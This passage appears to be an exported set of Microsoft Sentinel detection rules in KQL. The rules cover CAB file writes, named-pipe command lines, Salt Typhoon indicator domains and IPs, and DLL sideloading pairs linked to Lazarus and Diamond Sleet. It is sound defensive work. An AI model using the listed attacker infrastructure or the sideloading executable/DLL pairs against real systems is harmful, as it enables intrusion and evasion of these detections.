HH:mm:ss')","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1566"],"displayName":"J361 - Windows CAB File on Disk - Rule","enabled":true,"description":"The following analytic detects .cab files being written to disk. It leverages data from Endpoint Detection and Response (EDR) agents, focusing on events where the file name is '*.cab' and the action is 'write'. This activity is significant as .cab files can be used to deliver malicious payloads, including embedded .url files that execute harmful code. If confirmed malicious, this behavior could lead to unauthorized code execution and potential system compromise. Analysts should review the file path and associated artifacts for further investigation.\n\nMITRE:T1566.001","alertRuleTemplateName":null,"lastModifiedUtc":"2024-12-19T02:08:32.618452Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8407314f-c6e3-4f28-8941-a69a43c1d35b","name":"8407314f-c6e3-4f28-8941-a69a43c1d35b","etag":"\"1218e641-0000-2700-0000-6763872b0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"DeviceProcessEvents\r\n| where Timestamp between (ago(1d) .. now())\r\n| where ProcessCommandLine contains \"\\\\\\\\.\\\\pipe\\\\\" and not(ProcessCommandLine contains \"\\\\program files\")\r\n| where DeviceId in (DeviceInfo | where MachineGroup contains \"JSP\" | project DeviceId)\r\n| where not(InitiatingProcessFileName in (\"AGSService.exe\", \"fcagte.exe\", \"chrome.exe\", \"msedge.exe\", \"fcag.exe\", \"agsservice.exe\", \"agmservice.exe\", \"secomn64.exe\", \"vmware-print-redir-client.exe\"))\r\n| summarize count(), firstTime = min(Timestamp), lastTime = max(Timestamp) by InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, InitiatingProcessFolderPath, ProcessId, InitiatingProcessId, DeviceName, AccountName, FolderPath, MachineGroup\r\n| project DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, ProcessId, InitiatingProcessId, FolderPath, firstTime, lastTime, MachineGroup\r\n| extend firstTime = format_datetime(firstTime, 'yyyy-MM-dd HH:mm:ss'), lastTime = format_datetime(lastTime, 'yyyy-MM-dd HH:mm:ss')","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion","PrivilegeEscalation"],"techniques":["T1055"],"displayName":"J361 - Windows Process With NamedPipe CommandLine","enabled":true,"description":"The following analytic detects processes with command lines containing named pipes. It leverages data from Endpoint Detection and Response (EDR) agents, focusing on process command-line executions. This behavior is significant as it is often used by adversaries, such as those behind the Olympic Destroyer malware, for inter-process communication post-injection, aiding in defense evasion and privilege escalation. If confirmed malicious, this activity could allow attackers to maintain persistence, escalate privileges, or evade defenses, potentially leading to further compromise of the system. \nMITRE: T1055","alertRuleTemplateName":null,"lastModifiedUtc":"2024-12-19T02:38:30.9069161Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/DOD365-LAW/providers/Microsoft.SecurityInsights/alertRules/1f592770-1b9d-41e1-a144-bb168e7adfb4","name":"1f592770-1b9d-41e1-a144-bb168e7adfb4","etag":"\"47187482-0000-2700-0000-67642e7f0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//BAH_Salt_Typhoon_IOCs\n//Author: Shawn McWhirter\n//Description: Searches for activity related to Salt Typhoon open source related domains and IP addresses\n//False Positives: Attackers often change the IPs and domains they use, some of these may no longer be Salt Typhoon Related\nlet signInLookup = (\n    SigninLogs\n    | where DeviceDetail contains \"displayName\"\n    | extend DeviceDetailJson = parse_json(DeviceDetail)\n    | extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n    | distinct DeviceNameSI, UserPrincipalName\n    );\nlet SaltTyphoonDomains = dynamic([\"amazoncdns.com\", \"asparticrooftop.com\", \"avatars.dataanalyticsclub.com\", \"awsdns-531.com\", \"bbs.sonypsps.com\", \"c11r.awsdns-531.com\", \"cas04.awsdns-531.com\", \"cdn181.awsdns-531.com\", \"center.veryssl.org\", \"chat.itemdb.com\", \"chat.sonypsps.com\", \"cloudoca.spdns.de\", \"cloudprocenter.com\", \"clubworkmistake.com\", \"credits.offices-analytics.com\", \"dataanalyticsclub.com\", \"datacentreonline.com\", \"dateupdata.com\", \"e-forwardviewupdata.com\", \"earth.monovm.com\", \"everydailygames.com\", \"fitbookcatwer.com\", \"fonts.dataanalyticsclub.com\", \"ftp.google-ana1ytics.com\", \"ftp.google-ap1.com\", \"ftp.microsoft-update.co\", \"google-ana1ytics.com\", \"google-ap1.com\", \"gtalklite.com\", \"gtishare.com\", \"hateupopred.com\", \"holidayutility.com\", \"hotmailcontact.net\", \"image.dataanalyticsclub.com\", \"imap.dateupdata.com\", \"imap.newlylab.com\", \"lanxess-lab.com\", \"linux.updatelive-oline.com\", \"llnw-dd.awsdns-531.com\", \"login.hansoftupdate.com\", \"m.mildupdate.com\", \"mars.monovm.com\", \"mercury.monovm.com\", \"microsoft-outlook.org\", \"microsoft-update.co\", \"microsoftinforms.com\", \"mildupdate.com\", \"newhkdaily.com\", \"newlylab.com\", \"news.trendmicro-update.org\", \"ns101.awsdns-531.com\", \"offices-analytics.com\", \"onlineeylity.com\", \"plasticdrink.com\", \"pulseathermakf.com\", \"rdmail.redcrossco.com\", \"reclubpress.com\", \"redcrossco.com\", \"redsquare.redcrossco.com\", \"registre.organiccrap.com\", \"resource.offices-analytics.com\", \"server.gtalklite.com\", \"services.offices-analytics.com\", \"shalaordereport.com\", \"soffice.offices-analytics.com\", \"sonypsps.com\", \"spk.cloudie.hk\", \"sservice.hkmcadventist.org\", \"ssl3.awsdns-531.com\", \"toodblackrun.com\", \"tranning.redcrossco.com\", \"trendmicro-update.org\", \"trprivates.com\", \"trust.veryssl.org\", \"turkeyscenery.com\", \"turkeystraw.com\", \"unfeelmoonvd.com\", \"up.gtalklite.com\", \"update.deepsoftupdate.com\", \"update.gtalklite.com\", \"update.hancominc.com\", \"update.onlineeylity.com\", \"updatelive-oline.com\", \"venus.monovm.com\", \"verfiedoccurr.com\", \"veryssl.org\", \"w.trprivates.com\", \"waystrkeprosh.com\", \"webdns.spdns.org\", \"windows.updatelive-oline.com\", \"www.corpdns.fartit.com\", \"www.dataanalyticsclub.com\", \"www.datacentreonline.com\", \"www.google-ana1ytics.com\", \"www.google-ap1.com\", \"www.gtishare.com\", \"www.hotmailcontact.net\", \"www.iti.ac.kr\", \"www.itp.es\", \"www.lanxess-arena.de\", \"www.lanxess-lab.com\", \"www.larsentoubro.com\", \"www.microsoft-outlook.org\", \"www.microsoft-update.co\", \"www.oshkoshcorporation.com\", \"www.registre.organiccrap.com\", \"www.russianembassy.org\", \"www.sonypsps.com\", \"www.trendmicro-update.org\", \"www.turkeyscenery.com\", \"www.turkeystraw.com\", \"www.twitch.tw\", \"www.updatelive-oline.com\", \"xdmgwctese.com\", \"zmail.broadmediacloud.com\"\n    ]);\nlet SaltTyphoonIPs = dynamic([\"103.103.128.121\", \"103.103.131.40\", \"103.13.230.146\", \"103.140.238.110\", \"103.149.46.254\", \"103.15.28.228\", \"103.15.29.24\", \"103.159.133.209\", \"103.19.9.172\", \"103.224.80.86\", \"103.224.81.162\", \"103.24.0.142\", \"103.24.1.54\", \"103.242.133.185\", \"103.25.202.151\", \"103.42.13.116\", \"103.42.15.216\", \"103.59.144.183\", \"103.79.77.178\", \"103.79.77.200\", \"103.79.78.48\", \"104.168.211.246\", \"104.168.236.46\", \"104.207.134.11\", \"104.243.44.19\", \"104.245.145.23\", \"104.248.49.97\", \"104.248.78.27\", \"106.187.45.162\", \"106.187.98.115\", \"107.148.131.210\", \"107.173.83.123\", \"118.193.132.92\", \"121.127.234.250\", \"122.10.10.196\", \"122.10.82.120\", \"122.10.9.61\", \"124.137.11.10\", \"128.199.44.86\", \"138.68.133.211\", \"139.180.155.133\", \"139.180.208.225\", \"139.180.216.65\", \"139.59.165.51\", \"139.59.58.130\", \"139.59.81.253\", \"14.47.125.214\", \"142.93.182.54\", \"144.168.36.189\", \"144.168.36.21\", \"144.214.220.11\", \"144.214.220.114\", \"144.214.220.158\", \"144.214.220.207\", \"144.214.220.33\", \"146.70.79.48\", \"149.28.150.170\", \"154.220.3.17\", \"154.223.135.214\", \"156.255.2.183\", \"156.255.2.202\", \"156.255.2.205\", \"157.230.221.198\", \"159.65.157.175\", \"159.65.202.4\", \"159.65.80.157\", \"159.89.168.83\", \"160.20.145.171\", \"161.35.51.41\", \"165.232.154.116\", \"167.172.239.215\", \"167.99.239.29\", \"171.116.204.89\", \"171.116.207.238\", \"172.105.162.84\", \"172.93.165.12\", \"172.93.165.13\", \"172.93.188.220\", \"172.93.189.207\", \"172.93.189.9\", \"176.223.112.229\", \"177.67.82.218\", \"178.128.235.15\", \"178.79.177.69\", \"183.185.84.243\", \"183.185.90.168\", \"183.185.90.99\", \"183.185.91.141\", \"185.12.45.134\", \"189.2.116.166\", \"189.2.60.78\", \"189.52.17.42\", \"192.131.142.35\", \"192.169.236.189\", \"192.81.208.169\", \"193.171.202.150\", \"193.203.203.26\", \"193.239.86.168\", \"193.239.86.200\", \"194.156.98.129\", \"197.100.107.107\", \"198.100.107.107\", \"199.229.250.18\", \"202.146.221.195\", \"202.155.223.83\", \"202.57.40.227\", \"203.20.113.208\", \"203.9.150.153\", \"205.233.151.1\", \"206.189.123.156\", \"206.189.175.203\", \"206.189.180.4\", \"206.189.40.40\", \"206.53.160.200\", \"206.53.160.201\", \"206.53.160.202\", \"208.95.74.186\", \"210.116.106.66\", \"210.209.89.162\", \"211.110.174.105\", \"23.106.123.183\", \"27.102.113.240\", \"27.102.113.57\", \"27.102.118.177\", \"27.102.127.190\", \"31.3.243.51\", \"34.65.151.250\", \"35.187.148.253\", \"35.220.135.85\", \"39.109.5.161\", \"43.226.126.165\", \"43.242.34.195\", \"43.242.35.13\", \"45.117.98.121\", \"45.142.214.188\", \"45.159.48.227\", \"45.192.178.206\", \"45.77.241.33\", \"45.77.250.141\", \"5.62.62.235\", \"50.116.36.25\", \"50.248.10.133\", \"54.254.185.135\", \"66.42.62.250\", \"74.119.194.153\", \"85.204.74.143\", \"89.35.178.105\", \"91.245.255.13\", \"91.245.255.36\", \"91.245.255.72\", \"91.245.255.95\", \"95.174.65.140\"\n    ]);\n(union isfuzzy=true\n    (\n    DeviceNetworkEvents\n    | where isnotempty(RemoteUrl)\n    | where RemoteUrl has_any(SaltTyphoonDomains) or RemoteIP has_any(SaltTyphoonIPs)\n    | project\n        TimeGenerated,\n        DeviceName,\n        RemoteIP,\n        RemoteUrl,\n        InitiatingProcessAccountName,\n        Tactic = \"Possible Salt Typhoon IP/Domain Traffic\"\n    | extend\n        timestamp = TimeGenerated,\n        HostCustomEntity = DeviceName,\n        AccountCustomEntity = InitiatingProcessAccountName,\n        DNSName = RemoteUrl,\n        IPCustomEntity = RemoteIP\n    ),\n    (\n    DeviceEvents\n    | where FileOriginIP has_any(SaltTyphoonIPs) or FileOriginUrl has_any(SaltTyphoonDomains) or RemoteUrl has_any(SaltTyphoonDomains)\n    | project\n        TimeGenerated,\n        ActionType,\n        FileOriginUrl,\n        RemoteUrl,\n        AccountName,\n        AccountDomain,\n        DeviceName,\n        DeviceId,\n        Tactic = \"Possible Salt Typhoon IP/Domain Traffic\"\n    ),(\n    DeviceFileEvents\n    | where FileOriginUrl has_any(SaltTyphoonDomains) or FileOriginReferrerUrl has_any(SaltTyphoonDomains)\n    | project\n        TimeGenerated,\n        ActionType,\n        FileOriginUrl,\n        FileOriginReferrerUrl,\n        DeviceName,\n        DeviceId,\n        Tactic = \"Possible Salt Typhoon IP/Domain Traffic\"\n    )\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"RemoteUrl"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"RemoteIP"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileOriginUrl"},{"identifier":"Directory","columnName":"FileOriginReferrerUrl"}]}],"tactics":["InitialAccess","CredentialAccess","Persistence"],"techniques":["T1566","T1110","T1505"],"displayName":"BAH_Salt_Typhoon_IOCs","enabled":true,"description":"Searches for activity related to Salt Typhoon open-source related domains and IP addresses.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-12-19T14:32:29.0972973Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4108cb09-9d3b-4bd2-b147-ae416ea8c668","name":"4108cb09-9d3b-4bd2-b147-ae416ea8c668","etag":"\"f41ac381-0000-2700-0000-676f41840000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"DeviceInfo\r\n| where MachineGroup contains \"JSP\"\r\n| join kind=inner (DeviceNetworkEvents\r\n    | where ActionType == \"ConnectionSuccess\"\r\n    | where RemoteIP == \"27.102.113.57\" or RemoteIP == \"27.102.113.240\" or RemoteIP == \"27.102.114.55\" or RemoteIP == \"27.102.115.51\" or RemoteIP == \"27.102.129.120\" or RemoteIP == \"107.148.165.158\" or RemoteIP == \"154.223.135.214\"\r\n    or RemoteUrl contains \"impap.newlylab.com\" or RemoteUrl contains \"mail.reclubpress.com\" or RemoteUrl contains \"imap.webdignusdata.com\" or RemoteUrl contains \"freedecrease.com\" or RemoteUrl contains \"aftercould.com\" or RemoteUrl contains \"datacentreonline.com\" or RemoteUrl contains \"game.newfreepre.com\"\r\n    | project DeviceId, RemoteIP, RemoteUrl, Timestamp\r\n) on DeviceId\r\n| summarize count() by RemoteIP, RemoteUrl, bin(Timestamp, 1h)\r\n| where count_ > 1 // Adjust the threshold as needed\r\n| project Timestamp, RemoteIP, RemoteUrl, count_\r\n| order by count_ desc","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":[],"displayName":"J361 - DTO 24-0426 - IOC Search","enabled":true,"description":"Analytic Rule for IOCs found in DTO 24-0426","alertRuleTemplateName":null,"lastModifiedUtc":"2024-12-28T00:08:32.8353081Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/37d2a25c-b350-4c36-a412-0fff031dea9a","name":"37d2a25c-b350-4c36-a412-0fff031dea9a","etag":"\"f41a42d6-0000-2700-0000-676f43370000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let file_lookBack = 1d;\nlet signInLookup = (\n    SigninLogs\n    | where TimeGenerated >= ago(file_lookBack)\n    | where DeviceDetail contains \"displayName\"\n    | extend DeviceDetailJson = parse_json(DeviceDetail)\n    | extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n    | distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nlet deviceInfoLookup = (\n    DeviceInfo\n    | where MachineGroup contains \"JSP\"\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | distinct SILogDeviceName, MachineGroup\n);\n(union isfuzzy=True\n    (\n    DeviceFileEvents\n    | where ((ActionType == \"FileCreated\") and ((InitiatingProcessFileName =~ \"PresentationHost.exe\" and FileName =~ \"mscoree.dll\") or (InitiatingProcessFileName =~ \"colorcpl.exe\" and FileName =~ \"colorui.dll\") or (InitiatingProcessFileName =~ \"fixmapi.exe\" and FileName =~ \"mapistub.dll\") or (InitiatingProcessFileName =~ \"tabcal.exe\" and FileName =~ \"HID.dll\")))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | join kind=inner deviceInfoLookup on $left.SILogDeviceName == $right.SILogDeviceName\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        InitiatingProcessFileName,\n        InitiatingProcessFolderPath,\n        FolderPath,\n        FileName,\n        MD5,\n        Tactic = \"Detects sideloading of trojanized DLLs used in Lazarus APT campaign\"\n    ),\n    (\n    DeviceImageLoadEvents\n    | where ((ActionType == \"ImageLoaded\") and ((InitiatingProcessFileName =~ \"PresentationHost.exe\" and FileName =~ \"mscoree.dll\") or (InitiatingProcessFileName =~ \"colorcpl.exe\" and FileName =~ \"colorui.dll\") or (InitiatingProcessFileName =~ \"fixmapi.exe\" and FileName =~ \"mapistub.dll\") or (InitiatingProcessFileName =~ \"tabcal.exe\" and FileName =~ \"HID.dll\")))\n    | where not(FolderPath has_any(\"system32\", \"syswow64\", \"program files\", \"windows defender\\\\platform\", \"winsxs\", \"platform\", \"trend micro\"))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | join kind=inner deviceInfoLookup on $left.SILogDeviceName == $right.SILogDeviceName\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        InitiatingProcessFileName,\n        InitiatingProcessFolderPath,\n        FolderPath,\n        FileName,\n        MD5,\n        Tactic = \"Detects sideloading of trojanized DLLs used in Lazarus APT campaign\"\n    ),\n    (\n    DeviceFileEvents\n    | where ((ActionType == \"FileCreated\") and ((InitiatingProcessFileName =~ \"clip.exe\" and FileName =~ \"Version.dll\") or (FolderPath contains @\":\\ProgramData\\wsmprovhost.exe\" and FolderPath endswith @\":\\ProgramData\\DSROLE.dll\")))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | join kind=inner deviceInfoLookup on $left.SILogDeviceName == $right.SILogDeviceName\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        InitiatingProcessFileName,\n        FolderPath,\n        FileName,\n        MD5,\n        Tactic = \"Possible detection of DLL sideloading activity seen used by Diamond Sleet APT\"\n    ),\n    (\n    DeviceImageLoadEvents\n    | where ((ActionType == \"ImageLoaded\") and ((InitiatingProcessFileName =~ \"clip.exe\" and FileName =~ \"version.dll\") or (InitiatingProcessFileName =~ \"wsmprovhost.exe\" and FileName =~ \"DSROLE.dll\")))\n    | where not(FolderPath has_any(\"system32\", \"syswow64\", \"program files\", \"windows defender\\\\platform\", \"winsxs\", \"platform\", \"trend micro\"))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | join kind=inner deviceInfoLookup on $left.SILogDeviceName == $right.SILogDeviceName\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        InitiatingProcessFileName,\n        FolderPath,\n        FileName,\n        MD5,\n        Tactic = \"Possible detection of DLL sideloading activity seen used by Diamond Sleet APT\"\n    )\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"InitiatingProcessFileName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","PrivilegeEscalation","DefenseEvasion"],"techniques":["T1574"],"displayName":"J361_APT_DLL_Sideloading","enabled":true,"description":"Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. This analytic focuses on the specific executable and DLL combinations seen in the wild for both APT groups Lazarus and Diamond Sleet.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-12-28T00:15:50.6628879Z"}}]}